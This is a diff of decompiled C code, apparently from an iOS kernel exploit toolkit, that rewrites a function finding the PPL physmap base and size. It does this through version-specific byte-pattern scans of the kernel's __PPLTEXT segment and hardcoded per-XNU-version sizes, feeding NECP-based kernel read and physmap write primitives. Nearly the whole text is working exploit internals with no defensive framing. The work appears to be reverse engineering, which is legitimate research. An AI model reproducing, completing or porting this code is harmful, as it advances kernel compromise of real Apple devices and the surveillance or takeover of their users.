@@ -9108,7 +9108,7 @@ bool __fastcall necp_kread_region(struct_krwCtx *krwCtx, unsigned __int64 a2, __
     if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 0, 0, 0, 0) ) {
         return !!ppl_physmap_table_patch_write(krwCtx, a2, a3, a4, 0);
     }
-    if ( get_kwrite_fn(krwCtx, (__int64 *)&v24, &v231) )
+    if ( get_kwrite_fn(krwCtx, &v24, &v231) )
     {
         if ( v24 <= a2 )
         {
@@ -9293,121 +9293,85 @@ LABEL_32:
   return v10 == 0;
 }
 //----- (000000000001353C) ----------------------------------------------------
-bool __fastcall get_kwrite_fn(struct_krwCtx *krwCtx, __int64 *a2, int *a3)
+bool __fastcall get_kwrite_fn(struct_krwCtx *krwCtx, uint64_t *a2, uint32_t *a3)
 {
-  __int64 v6; // x22
-  int v7; // w8
-  __int64 v9; // x0
-  int v10; // w8
-  int v11; // w9
-  char *v13; // x22
-  unsigned __int64 v14; // x9
-  __int64 v15; // x0
-  __int64 v16; // x23
-  unsigned __int64 v17; // x0
-  unsigned __int64 v18; // x0
-  __int64 v19; // x0
-  int v20; // w9
-  __int128 v21; // [xsp+0h] [xbp-60h] BYREF
-  unsigned __int64 v22; // [xsp+10h] [xbp-50h]
-  __int128 v23; // [xsp+18h] [xbp-48h] BYREF
-  unsigned __int64 v24; // [xsp+28h] [xbp-38h]
-
-  v6 = krwCtx->pplPhysmapBase;
-  if ( v6 )
+  uint64_t physmapBase = krwCtx->pplPhysmapBase;
+  uint32_t physmapSize = krwCtx->pplPhysmapSize;
+  if ( physmapBase )
   {
-    v7 = krwCtx->pplPhysmapSize;
-LABEL_3:
-    *a2 = v6;
-    *a3 = v7;
+    *a2 = physmapBase;
+    *a3 = physmapSize;
     return 1;
   }
-  v9 = krwCtx->kernelMachoCtx;
-  v10 = *(uint32_t *)(v9 + 112);
-  if ( v10 > 8791 )
+
+  uint64_t machoCtx = krwCtx->kernelMachoCtx;
+  uint32_t xnuMajorVersion = *(uint32_t *)(machoCtx + 112);
+  const char *pattern = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
+  if ( xnuMajorVersion > 8791 )
   {
-    if ( v10 != 8792 && v10 != 8796 )
-    {
-      v11 = 10002;
-LABEL_13:
-      if ( v10 != v11 )
-      {
-        v13 = 0;
-        goto LABEL_15;
-      }
-    }
+    if ( xnuMajorVersion != 8792 && xnuMajorVersion != 8796 && xnuMajorVersion != 10002 )
+      pattern = 0;
   }
-  else if ( (unsigned int)(v10 - 8019) >= 2 )
+  else if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 )
   {
-    if ( v10 == 6153 )
-    {
-      v13 = "1F 01 .. EB 20 91 .. FA .. .. 00 54";
-      goto LABEL_15;
-    }
-    v11 = 7195;
-    goto LABEL_13;
+    if ( xnuMajorVersion == 6153 )
+      pattern = "1F 01 .. EB 20 91 .. FA .. .. 00 54";
+    else if ( xnuMajorVersion != 7195 )
+      pattern = 0;
   }
-  v13 = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
-LABEL_15:
-  macho_walk_segment_by_name("__PPLTEXT", &v23, v9);
+  if ( !pattern )
+    return 0;
+
+  SearchObj pplTextRange;
+  macho_walk_segment_by_name("__PPLTEXT", machoCtx, &pplTextRange);
   if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(6153, 102, 2, 0, 0) && krwCtx->xnuMajorVersion <= 7194 )
   {
-    if ( !*((uint64_t *)&v23 + 1) )
+    if ( !pplTextRange.base_ptr )
       return 0;
-    v14 = krwCtx->pageSizeOrSomething;
-    if ( v24 <= v14 )
+    uint64_t pageSize = krwCtx->pageSizeOrSomething;
+    if ( pplTextRange.size <= pageSize )
       return 0;
-    *((uint64_t *)&v23 + 1) += v14;
-    v24 -= v14;
+    pplTextRange.base_ptr += pageSize;
+    pplTextRange.size -= pageSize;
   }
-  v21 = v23;
-  v22 = v24;
-  v15 = kernel_pattern_scan((__int64)&v21, v13, 0);
-  if ( v15 )
+
+  uint64_t patternHit = kernel_pattern_scan(&pplTextRange, pattern, 0);
+  if ( !patternHit )
+    return 0;
+
+  uint64_t baseRef = find_kernel_func((__int64 *)krwCtx->kernelMachoCtx, (__int64 *)(patternHit - 16));
+  physmapBase = baseRef ? macho_read_u64_thunk(krwCtx->kernelMachoCtx, baseRef) : 0;
+  if ( !physmapBase )
+    return 0;
+
+  if ( krwCtx->xnuMajorVersion >= 7195 )
   {
-    v16 = v15;
-    v17 = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v15 - 16));
-    if ( v17 )
-      v6 = macho_read_u64_thunk(krwCtx->kernelMachoCtx, v17);
-    else
-      v6 = 0;
-    if ( krwCtx->xnuMajorVersion >= 7195 )
-    {
-      v18 = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v16 - 8));
-      if ( !v18 )
-        return 0;
-      v19 = macho_read_u64_thunk(krwCtx->kernelMachoCtx, v18);
-      if ( !v19 )
-        return 0;
-      v7 = v19 - v6;
-      if ( !v6 )
-        return 0;
-LABEL_31:
-      v20 = krwCtx->xnuMajorVersion;
-      if ( v20 <= 7194 )
-      {
-        if ( v20 < 6153 )
-        {
-          v7 = 589824;
-        }
-        else if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
-        {
-          v7 = 573440;
-        }
-        else
-        {
-          v7 = 557056;
-        }
-      }
-      krwCtx->pplPhysmapBase = v6;
-      krwCtx->pplPhysmapSize = v7;
-      goto LABEL_3;
-    }
-    v7 = 0;
-    if ( v6 )
-      goto LABEL_31;
+    uint64_t endRef = find_kernel_func((__int64 *)krwCtx->kernelMachoCtx, (__int64 *)(patternHit - 8));
+    if ( !endRef )
+      return 0;
+    uint64_t physmapEnd = macho_read_u64_thunk(krwCtx->kernelMachoCtx, endRef);
+    if ( !physmapEnd )
+      return 0;
+    physmapSize = physmapEnd - physmapBase;
   }
-  return 0;
+  else if ( krwCtx->xnuMajorVersion < 6153 )
+  {
+    physmapSize = 589824;
+  }
+  else if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
+  {
+    physmapSize = 573440;
+  }
+  else
+  {
+    physmapSize = 557056;
+  }
+
+  krwCtx->pplPhysmapBase = physmapBase;
+  krwCtx->pplPhysmapSize = physmapSize;
+  *a2 = physmapBase;
+  *a3 = physmapSize;
+  return 1;
 }
 // 19B94: using guessed type __int64 __fastcall macho_read_u64_thunk(uint64_t, uint64_t);
 
@@ -9468,7 +9432,7 @@ bool __fastcall physmap_table_write_versioned(struct_krwCtx *krwCtx, unsigned __
     if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) ) return 0;
     if ( krwCtx->xnuVersionPacked >= (uint64_t)XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
         return check_physmap_range_necp(krwCtx, a2, a3);
-    if ( !get_kwrite_fn(krwCtx, (__int64 *)&v7, (int *)&v6) )
+    if ( !get_kwrite_fn(krwCtx, &v7, &v6) )
         return 0;
     if ( v7 <= a2 && a2 + 4 <= v7 + v6 ) {
         return necp_kread_region(krwCtx, a2, (__int64)&v8, 4);
